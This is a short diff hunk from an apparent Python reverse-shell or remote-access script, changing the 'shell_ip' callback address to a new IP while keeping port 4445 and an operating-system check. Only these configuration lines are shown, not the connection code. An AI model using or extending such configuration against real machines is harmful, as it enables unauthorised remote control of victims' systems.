@@ -4,7 +4,7 @@ import os
 
 
 operating = platform.system()
-shell_ip = "141.55.32.128"
+shell_ip = "100.74.255.31"
 port = 4445
 
 
